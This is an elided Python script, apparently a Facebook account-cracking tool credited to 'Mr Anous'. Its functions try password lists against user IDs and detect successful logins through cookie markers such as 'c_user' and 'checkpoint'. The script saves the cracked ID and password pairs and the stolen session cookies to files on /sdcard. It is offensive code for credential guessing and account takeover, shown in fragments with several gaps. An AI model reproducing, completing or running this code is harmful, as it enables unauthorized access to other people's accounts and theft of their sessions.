...
----------------------------------------------
\033[1;37m[+] Author       :       Mr Anous
\033[1;37m[+] Github       :       https://github.com/Anous
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:
                                ...
                                exit(' THANKS FOR USE Anous TOOL ')
                        else:
                                exit(' Select valid option .')                
                else:
                        print("\033[1;32m ANOUS SERVER IS OFF")
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\r\r\033[1;32m [ANOUS-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ANOUS_OK_ids_M1.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/JUTT_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                #open('/sdcard/JUTT-M1-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ANOUS-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ANOUS-M2] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
...
def graph1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ANOUS-M4] %s [OK-%s] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ANOUS-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ANOUS_OK_ids_M4.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/JUTT_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                           #     open('/sdcard/JUTT-M4-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ANPUS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ANOUS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [A N O U S] %s /  OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/ANOUS-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [ANPUS-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ANOUS-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
